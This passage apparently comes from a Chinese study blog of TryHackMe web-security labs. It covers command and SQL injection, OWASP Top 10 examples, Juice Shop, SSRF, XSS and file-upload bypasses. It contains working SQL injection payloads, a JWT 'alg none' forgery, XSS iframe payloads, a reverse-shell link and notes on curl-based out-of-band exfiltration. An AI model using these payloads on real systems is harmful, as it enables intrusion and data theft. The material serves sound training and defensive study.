分为两类:</p><p>1.有回显的rce</p><p>2.无回显的rce</p><p>可以结合sleep命令来进行，或者是利用重定向的符号，把结果打印到一个文件中  类似于cat /flag &gt; 1.txt 还可以利用curl进行dns外带</p><p>修复命令注入:</p><p>  方法:减少使用危险的函数，对用户输入进行严格过滤 通过waf进行防御</p><p>实例:</p><p>127.0.0.1;要执行的命令</p><h3 id="SQL-Injection-sql注入"><a href="#SQL-Injection-sql注入" class="headerlink" title="SQL Injection (sql注入)"></a>SQL Injection (sql注入)</h3><p>下面记录一些知识点:</p><p>select * from users limit 1; =&gt; 查询第一行的数据 </p><p>select * from users limit 1,1; 意思是跳过第一行，打印第二行</p><p>limit 2,1 就是跳过前两行，打印第三行</p><p>like % 进行匹配  </p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403082316313.png" alt="image-20240308231602070"></p><p>;代表sql查询的结束</p><p>实践:</p><p>level1: 很常规的sql注入  (-2 union select 1,2,group_concat(id,username,password) from staff_users)</p><p>level2:万能密码登录</p><p>level3:  就是利用了like语句和盲注的特性，在本界面中存在的就返回true，否则就返回false  (布尔盲注)</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>首先我们先查询数据库  admin123<span class="hljs-string">&#x27; union select 1,2,3 where database() like &#x27;</span>a%<span class="hljs-string">&#x27;;--  通过爆破我们可以得到数据库的名字=&gt;sqli_three</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.然后我们再去爆破表名 admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--  得到表的名字=&gt;users</span><br><br><span class="hljs-number">3.</span>接着是爆列名 admin123<span class="hljs-string">&#x27; union select 1,2,3 from information_schema.columns where table_schema=&#x27;</span>sqli_thre<span class="hljs-string">e&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name like &#x27;</span>a%<span class="hljs-string">&#x27;;--  </span><br><span class="hljs-string">4. 列名有的不仅仅一个 然后我们得到一个之后就需要把这个给排除掉 </span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span>!=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">-- </span><br><br><span class="hljs-number">5.</span>得到列名之后就是内容了 然后一样的思路 列名得到的是 (id,username,<span class="hljs-keyword">password</span>)<br>admin123<span class="hljs-string">&#x27; union select 1,2,3 from users where username like &#x27;</span>a%<span class="hljs-string">&#x27;;--</span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br>最终得到 <span class="hljs-keyword">admin</span> <span class="hljs-number">3845</span><br></code></pre></td></tr></table></figure><p>level4: (时间盲注)</p><p>跟布尔盲注的区别是，它并不会返回语句是否执行成功 然后有一个语句是延迟的 sleep() 我们可以通过这个来进行判断相关信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; union select 1,sleep(5);-- //判断有两列 因为这样它会延迟5秒后返回界面</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.剩下的步骤跟布尔盲注没什么区别 就是有了sleep来判断查询的数据是否存在</span><br><span class="hljs-string"></span><br><span class="hljs-string">3.admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br><br>然后这一关用户名是<span class="hljs-keyword">admin</span> 密码的话仍然是<span class="hljs-number">4</span>位数字 需要自己去爆破<br></code></pre></td></tr></table></figure><p>到具体情况还得写脚本进行爆破，或者是利用burp进行爆破  </p><p>修复:</p><p>1.白名单，对于一些不允许输入的字符串进行一个替换</p><p>2.对用户输入的特殊字符进行转义处理</p><h2 id="Web-Hacking-Fundamentals"><a href="#Web-Hacking-Fundamentals" class="headerlink" title="Web Hacking Fundamentals"></a>Web Hacking Fundamentals</h2><h3 id="OWASP-Top-10-2021"><a href="#OWASP-Top-10-2021" class="headerlink" title="OWASP Top 10 - 2021"></a>OWASP Top 10 - 2021</h3><p>Broken Access Control</p><p>其实就是一个未授权访问</p><p>Broken Access Control (IDOR Challenge)</p><p>IDOR漏洞 可以访问其他用户的相关信息 可能会造成敏感信息的泄露 漏洞原因:应用程序没有对用户是否具有相关权限访问做出限制。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403122035395.png" alt="image-20240312203542028"></p><p>Cryptographic Failures</p><p>简单的来讲就是用户和服务之间通信的加密不是那么的严格，容易被破解，从而导致信息的泄露。</p><p>在更复杂的级别上，利用某些加密故障通常涉及诸如“中间人攻击”之类的技术，攻击者会通过他们控制的设备强制用户连接。然后，他们将利用对任何传输数据的弱加密来访问截获的信息（如果数据首先被加密）。当然，许多示例要简单得多，并且可以在 Web 应用程序中找到漏洞，而无需高级网络知识即可利用这些漏洞。事实上，在某些情况下，敏感数据可以直接在 Web 服务器本身上找到。</p><p>Cryptographic Failures (Supporting Material 1)</p><p>有些数据库也可以存储为文件 被称为平面文件数据库 然后我们可以下载下来</p><p>具体操作:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>sqlite3 &lt;<span class="hljs-keyword">database</span>-<span class="hljs-type">name</span>&gt;<br><span class="hljs-number">2.</span> .<span class="hljs-keyword">tables</span>  //查看表名<br><span class="hljs-number">3.</span> PRAGMA table_info(<span class="hljs-built_in">table_name</span>); //可以出现列名<br><span class="hljs-number">4.</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-built_in">table_name</span>;    //查看表里面的内容<br></code></pre></td></tr></table></figure><p>有的时候我们得到的密码是一些经过nd5加密后的 然后我们需要去一些平台去解密</p><p><a href="https://crackstation.net/">CrackStation - 在线密码哈希破解 - MD5、SHA1、Linux、Rainbow Tables 等</a></p><p>挑战:</p><p>在login网页源代码中发现信息 /assets</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131358159.png" alt="image-20240313135757037"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131359093.png" alt="image-20240313135925920"></p><p>然后下载下来</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131403882.png" alt="image-20240313140356643"></p><p>拿到了密码登录即可</p><p>Injection</p><p>简要概括了一下sql注入和命令注入。</p><ul><li><strong>SQL注入：</strong>当用户控制的输入传递给 SQL 查询时，会发生这种情况。因此，攻击者可以传入 SQL 查询来操纵此类查询的结果。当此输入传递到数据库查询时，攻击者可能会访问、修改和删除数据库中的信息。这意味着攻击者可以窃取敏感信息，例如个人详细信息和凭据。</li><li><strong>命令注入：</strong>当用户输入传递给系统命令时，会发生这种情况。因此，攻击者可以在应用程序服务器上执行任意系统命令，从而可能允许他们访问用户的系统。</li></ul><p>防止注入攻击的主要防御措施是确保用户控制的输入不会被解释为查询或命令。有不同的方法可以做到这一点：</p><ul><li><strong>使用允许列表：</strong>当输入发送到服务器时，此输入将与安全输入或字符列表进行比较。如果输入被标记为安全，则对其进行处理。否则，它将被拒绝，并且应用程序将引发错误。</li><li><strong>剥离输入：</strong> 如果输入包含危险字符，则在处理之前删除这些字符。</li></ul><p>实例:</p><p>反引号命令执行 </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">`cmd`</span><br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403131913142.png" alt="image-20240313191313732"></p><p>hgame2024某个题就是这样的</p><p>就有一个点:</p><p>在linux中sbin目录通常存放着系统管理员 可以在/etc/passwd中查看</p><p>Insecure Design</p><p>这个是在开发过程中，开发人员为了测试便捷，可能会有一些不安全的地方，然后在实际生产的环境中，忘记修改了导致一些漏洞的产生。</p><p>实例:</p><p>首先根据说明，先在忘记密码那里输入joseph用户</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132242159.png" alt="image-20240313224235733"></p><p>然后有三个问题，我们选择第二个，这个容易进行猜测，试试红，蓝，白，绿等常见的颜色，最后发现是绿。</p><p>最后可以得到joseph用户的密码</p><ol start="5"><li>Security Misconfiguration</li></ol><p>安全配置错误与其他前 10 大漏洞不同，因为它们发生在可以适当配置安全性但未正确配置的情况下。即使您下载了最新的软件，糟糕的配置也可能使您的安装容易受到攻击。</p><p>安全错误配置包括：</p><ul><li>对云服务（如 S3 存储桶）的权限配置不当。</li><li>启用不必要的功能，例如服务、页面、帐户或权限。</li><li>密码未更改的默认帐户。</li><li>错误消息过于详细，允许攻击者了解有关系统的更多信息。</li><li>不使用 <a href="https://owasp.org/www-project-secure-headers/">HTTP 安全标头</a>。</li></ul><p>此漏洞通常会导致更多漏洞，例如允许您访问敏感数据的默认凭据、XML 外部实体 （XXE） 或管理页面上的命令注入。</p><p>还可能会导致一些ssti漏洞</p><p>实例:先访问/console 进入控制台，可以执行python命令 在ssti中有的是需要计算pin码，然后再进入控制台执行命令</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">import <span class="hljs-built_in">os</span>;<span class="hljs-built_in">os</span>.<span class="hljs-built_in">popen</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-built_in">read</span>();<br></code></pre></td></tr></table></figure><ol start="6"><li>Vulnerable and Outdated Components</li></ol><p>有时，您可能会发现您正在渗透测试的公司/实体正在使用具有已知漏洞的程序。</p><p>例如，假设一家公司已经有几年没有更新他们的 WordPress 版本了，使用 <a href="https://wpscan.com/wordpress-security-scanner">WPScan</a> 等工具，您会发现它是 4.6 版。一些快速研究将揭示 WordPress 4.6 容易受到未经身份验证的远程代码执行 （RCE） 攻击，更好的是，您可以在 <a href="https://www.exploit-db.com/exploits/41962">Exploit-DB</a> 上找到已经进行的漏洞利用。</p><p>Vulnerable and Outdated Components - Exploit</p><p>我们在知道该版本存在漏洞的情况下，下一步要做的就是去利用这个漏洞。 可以在exploit中寻找相关的漏洞信息。</p><p>实例:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132343773.png" alt="image-20240313234355495"></p><p>去exploit中搜索online book store </p><p>然后可以找到<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132344494.png" alt="image-20240313234444214"></p><p>下载下来</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403132348902.png" alt="image-20240313234811766"></p><ol start="7"><li>Identification and Authentication Failures</li></ol><p>主要介绍了身份验证的一些绕过。</p><p>1.弱口令</p><p>2.爆破</p><p>3.通过构造cookie进行登录</p><p>然后相关修复过程:</p><p>1.使用强密码 </p><p>2.对登录次数进行限制</p><p>3.实施多重身份验证</p><p>实例:</p><p>首先我们进去之后是一个登录框，然后当我们使用已经存在的用户去登录时，这个时候我们并不知道密码，所以我们可以去尝试重新注册该用户</p><p>如果注册成功，所拥有的权限是相同的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403141933290.png" alt="image-20240314193314859"></p><p>注意在登录的时候前面也要添加空格。</p><p>8.Software and Data Integrity Failures</p><p>主要介绍了一些数据和和软件的完整性，通常我们在网上下载一个软件时，其开发者会设计一段经过hash加密过后的值 这是判断我们下载的数据是否被修改的一个重要评判。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">在linux中查看下载文件的md5值方法:<br><span class="hljs-function"><span class="hljs-title">md5sum</span></span> ......<br><br>sha1:<br><span class="hljs-function"><span class="hljs-title">sha1sum</span></span> ......<br><br>sha256:<br><span class="hljs-function"><span class="hljs-title">sha256sum</span></span>......<br></code></pre></td></tr></table></figure><p>Software Integrity Failures (软件完整性)</p><p>如果我们有一个网站，该网站使用第三方库，这些库存储在一些您无法控制的外部服务器中。比如说: jQuery </p><p>当用户去访问该网站时，浏览器将读取其HTML代码并从指定的外部源下载jQuery。现在如果攻击者攻击了jQery官方网站，并在里面插入了恶意的代码，每一个访问该网站的人都会中招。所以我们需要对这个js地址进行hash加密，这样只有两者的hash相同时，才能执行。</p><p>相关网站:<a href="https://www.srihash.org/">SRI 哈希生成器 (srihash.org)</a></p><p>Data Integrity Failures(数据完整性)</p><p>当我们登录一个网站时，我们的账号信息会存储在cookie中，有的时候这些cookie会被修改，导致可以登录其他的用户，所以需要一些安全机制来保护它们不会被篡改。</p><p>其中一种实现方法就是<strong>JSON Web 令牌 （JWT）</strong></p><p>先来看看jwt的组成部分。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/11c86acaea05f98045cec5634e03e997.png"></p><p>分为三部分，第一部分是header头，指示JWT的元数据，指明了使用什么签名算法。第二部分包含键值对，其中包含Web应用程序希望客户端存储的数据。第三部分是利用密钥进行加密后的值，这是保护的基础，只有我们知道密钥才能修改payload。</p><p>这三部分都是base64加密的，但是第三部分有二进制的数据，所以解密过后也查看不了有用的信息。</p><p>有防也有攻，下面是如何进行破解。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-number">1</span>.修改<span class="hljs-selector-tag">Header</span>头里面的alg为<span class="hljs-attribute">none</span> <br><span class="hljs-number">2</span>.删除签名部分，但是保留点<br></code></pre></td></tr></table></figure><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f5d1b4ef49ff4eef52e7617631225e8a.png"></p><p>实例:</p><p>首先利用guest的身份进行登录，账号密码都是guest，但是得使用admin身份才能查看flag</p><p>cookie值如下:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142051260.png" alt="image-20240314205128142">  </p><p>然后按照上面的操作进行即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142056314.png" alt="image-20240314205642031"></p><ol start="9"><li>Security Logging and Monitoring Failures</li></ol><p>这主要介绍了日志文件的重要性，以及日志文件需要保存的内容</p><p>设置 Web 应用程序时，应记录用户执行的每个操作。日志记录很重要，因为在发生事件时，可以跟踪攻击者的活动。一旦他们的行为被追踪，就可以确定他们的风险和影响。如果没有日志记录，就无法判断攻击者在访问特定 Web 应用程序时执行了哪些操作。这些更显着的影响包括：</p><ul><li><strong>监管损害：</strong>如果攻击者获得了对个人身份用户信息的访问权限，并且没有这方面的记录，则最终用户会受到影响，并且应用程序所有者可能会受到罚款或更严厉的处罚，具体取决于法规。</li><li><strong>进一步攻击的风险：</strong>如果不进行日志记录，攻击者的存在可能无法检测到。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步攻击。</li></ul><p>日志中存储的信息应包括以下内容：</p><ul><li>HTTP 状态代码</li><li>时间戳</li><li>用户名</li><li>API 端点/页面位置</li><li>IP 地址</li></ul><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142106579.png" alt="image-20240314210621460"></p><p>这些日志包含一些敏感信息，因此请务必确保它们安全存储，并且这些日志的多个副本存储在不同的位置。</p><p>您可能已经注意到，在发生违规或事件后，日志记录更为重要。理想的情况是进行监控以检测任何可疑活动。检测此可疑活动的目的是完全阻止攻击者，或者在检测到攻击者的存在比预期晚得多时减少攻击者造成的影响。可疑活动的常见示例包括：</p><ul><li>多次未经授权尝试执行特定操作（通常是身份验证尝试或访问未经授权的资源，例如管理页面）</li><li>来自异常 IP 地址或位置的请求：虽然这可能表明其他人正在尝试访问特定用户的帐户，但它也可能具有误报率。</li><li>使用自动化工具：特定的自动化工具可以很容易地识别，例如使用User-Agent标头的值或请求的速度。这可能表明攻击者正在使用自动化工具。</li><li>常见有效负载：在 Web 应用程序中，攻击者通常使用已知有效负载。检测这些有效负载的使用可能表明存在对应用程序进行未经授权/恶意测试的人。</li></ul><p>仅仅检测可疑活动是没有帮助的。需要根据影响级别对这种可疑活动进行评级。例如，某些操作将比其他操作产生更大的影响。这些影响更大的行动需要尽快得到回应;因此，他们应该发出警报，以引起有关各方的注意。</p><p>实例:</p><p>分析日志可以知道</p><p>49.99.13.16是攻击ip，然后使用的攻击是暴力破解(Brute Force)</p><ol start="10"><li>Server-Side Request Forgery (SSRF)</li></ol><p>ssrf 服务器端请求伪造，当攻击者可以强制 Web 应用程序代表他们向任意目标发送请求，同时控制请求本身的内容时，就会发生此类漏洞。SSRF 漏洞通常来自我们的 Web 应用程序需要使用第三方服务的实现。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png" alt="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/271d0075650cdf6499f994f99fa7eb8a.png"></p><p>ssrf的危害:</p><p>1.探测内网，探测那些我们不能访问的内容</p><p>2.与一些非http服务交互以获取远程代码执行</p><p>实例:</p><p>首先进入界面，观察一波 点击admin，发现只有本机地址(localhost)才能访问，有一个下载文件的点很可疑，访问看一下。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142200295.png" alt="image-20240314220006071"></p><p>就是这里，server我们可以控制，可以修改成我们监听的ip地址加端口</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142203248.png" alt="image-20240314220315967"></p><p>然后我们还可以利用这个去访问localhost/admin的信息</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210976.png" alt="image-20240314221015887"></p><p>然后会把admin下的文件给下载下来，查看即可</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403142210638.png" alt="image-20240314221054350"></p><h3 id="OWASP-Juice-Shop"><a href="#OWASP-Juice-Shop" class="headerlink" title="OWASP Juice Shop"></a>OWASP Juice Shop</h3><p>Inject the juice</p><p>登录管理员用户 万能密码进行登录 在邮箱那里 ‘or 1=1 – 然后密码随便填 </p><p>然后如果是bender用户登录的话，思路也是一样的</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403152101665.png" alt="image-20240315210145357"></p><p>Who broke my lock?!</p><p>上面的是解决登录问题，现在这个主要是解决密码的问题，我们在上面已经可以登录管理员的账号了，但是密码我们并不知道。</p><p>我们可以尝试进行密码的爆破。</p><p>实例:</p><p>1.获取管理员的密码，对密码进行爆破</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403170016479.png" alt="image-20240317001650078"></p><p>2.重置用户的密码:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181933452.png" alt="image-20240318193331214"></p><p>主要是根据名字和喜好进行的一个猜测，所以以后设置问题的时候还是严谨一点。</p><p>根据前面的星际穿越和名字进行一个搜索，在google中可以查到相关信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181939380.png" alt="image-20240318193942179"></p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403181940791.png" alt="image-20240318194003630"></p><p>知道了信息就可以进行重置密码了。</p><p> AH! Don’t look!</p><p>信息泄露。</p><p>实例:</p><p>在关于我们那里，有一个绿色的链接，是一个下载md文件的链接<img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182045122.png" alt="image-20240318204508963"></p><p>然后我们访问ftp目录，看是否存在敏感信息。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182046562.png" alt="image-20240318204602306"></p><p>看起来是存在的，可以下载下来看看里面都是什么。</p><p>但是当我们下载非md和pdf的文件时，就会出现403，这个时候我们可以利用%00进行绕过。</p><p>%00是一个NULL终止符，告诉服务器在这个地方进行停止，然后后面的值就是空的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182142082.png" alt="image-20240318214233803"></p><p>Who’s flying this thing?</p><p>主要是越权，分为水平越权(当用户可以执行具有<strong>相同</strong>权限级别的其他用户的操作或访问数据时发生。)还有一个是垂直越权(当用户可以执行具有<strong>更高</strong>权限级别的其他用户的操作或访问数据时发生。)</p><p><img src="https://i.imgur.com/bJ9WKY4.png" alt="img"></p><p>实例:</p><p>我们在前端里面发现一个administration,然后尝试去访问发现并不得行，然后我们去登录管理员用户，再去访问这个路径就可以了。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403182201934.png" alt="image-20240318220157631"></p><p>Where did that come from?</p><p>主要是关于xss的相关内容。</p><p>xss分为三类，分别是DOM型xss,反射型xss，存储型xss.</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201808117.png" alt="image-20240320180845973"></p><p>实例:</p><p>DOM型的xss</p><p>在搜索框那里可以进行DOM型的xss </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201815266.png" alt="image-20240320181546019"></p><p>存储型xss</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201849455.png" alt="image-20240320184941297"></p><p>反射型xss:</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403201859281.png" alt="image-20240320185942012"></p><p>注意一下这里包裹xss的是``</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;iframe src=<span class="hljs-string">&quot;javascript:alert(`xss`)&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="Upload-Vulnerabilities"><a href="#Upload-Vulnerabilities" class="headerlink" title="Upload Vulnerabilities"></a>Upload Vulnerabilities</h3><p>首先做一些前置工作，在/etc/hosts 下添加一些信息。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ip    overwrite<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> shell<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> java<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> annex<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> magic<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> jewel<span class="hljs-selector-class">.uploadvulns</span><span class="hljs-selector-class">.thm</span> demo<span class="hljs-selector-class">.uploadvulns</span>.thm<br></code></pre></td></tr></table></figure><p>这个房间主要是介绍一些文件上传的利用点。</p><p>Overwriting Existing Files(覆盖文件)</p><p>当我们成功上传上去一个文件时，其文件名会被更改,以防止文件覆盖。文件名有时可能是随机的，或者是当前上传的时间和日期添加到文件末尾，或者是当上传一个相同文件名时，直接返回错误。</p><p>实例:</p><p>我们查看网页源代码，知道图片名字是mountains.jpg，然后我们再去上传一个同名字的图片，就会造成一个文件覆盖。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212013267.png" alt="image-20240321201326902"></p><p>Remote Code Execution(远程代码执行)</p><p>就是往服务端上传一个一句话木马,或者是反弹shell的命令.</p><p>实例:</p><p>首先通过dirsearch扫目录，可以看到上传路径。</p><p>然后上传进去一个一句话木马就行了。</p><p>Filtering</p><p>上面都是没过滤的，下面这个讲的是一些过滤方法。</p><p>大体的分为两大类:</p><p>1.客户端的一个过滤，这里的话是在用户浏览器的一个过滤，相对来说是很好绕过的，禁用js即可。</p><p>2.另外一个是在服务端的一个过滤，这里的绕过就需要考虑很多了，我们是不知道服务端所执行的代码，所以我们需要进行不断的尝试绕过。</p><p>下面来具体介绍一下过滤的方法:</p><p>1.设置白名单(即只允许我们定义的文件上传)和黑名单(不允许我们定义的文件上传)。MS Windows 仍然使用它们来识别文件类型</p><p>2.文件类型筛选。检查MIME的值是否符合图片类型的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403212106148.png" alt="image-20240321210633022"></p><p>还有就是不同的图片，前八个字节是固定的，通常uinx通过这个来检查文件是否符合条件。</p><p>例如:png图片的前八个字节是 89 50 4E 47 0D 0A 1A 0A</p><p>3.文件大小限制，就是限制上传文件的大小，防止上传大的文件造成服务器资源匮乏。</p><p>4.对文件名的过滤，检查文件名是否重复以及是否存在一些不合法的字符。</p><p>5.文件内容的过滤。</p><p>反向shell文件:<a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</a></p><p>实例:</p><p>这个实例thm给了四种，我只知道其中的三种，最后一种挺有意思的。</p><ol><li><em>在浏览器中关闭 Javascript</em> - 如果网站不需要 Javascript 来提供基本功能，这将起作用。如果完全关闭 Javascript 会阻止网站运行，那么其他方法之一会更可取;否则，这可能是完全绕过客户端筛选器的有效方法。</li><li><em>拦截并修改传入页面。</em> 使用 Burpsuite，我们可以拦截传入的网页并在 Javascript 过滤器有机会运行之前将其剥离。</li><li><em>拦截并修改文件上传。</em>如果前面的方法在加载网页<em>之前</em>起作用，则此方法允许网页正常加载，但在文件已通过（并被筛选器接受）后拦截文件上传。同样，我们将介绍在任务过程中使用此方法的过程。</li><li><em>将文件直接发送到上传点。</em>为什么要使用带有过滤器的网页，当您可以使用诸如 ？将数据直接发布到包含用于处理文件上传的代码的页面是完全绕过客户端筛选器的另一种有效方法。</li></ol><p>利用curl语句进行上传。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-literal">-X</span> POST <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;submit:&lt;value&gt;&quot;</span> <span class="hljs-operator">-F</span> <span class="hljs-string">&quot;&lt;file-parameter&gt;:@&lt;path-to-file&gt;&quot;</span> &lt;site&gt;<br></code></pre></td></tr></table></figure><p>这里给的很清楚了，就不做演示了。</p><p> Bypassing Server-Side Filtering: File Extensions</p><p>从这里开始就是绕过服务端的了。</p><p>绕过的方式比较杂一点，黑名单的话就是不断的进行尝试，直到我们可以上传上去我们构造的shell文件。</p><p>实例:</p><p>这里thm给的上传环境还挺有意思的。</p><p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403261957924.png" alt="image-20240326195715756"></p><p>select 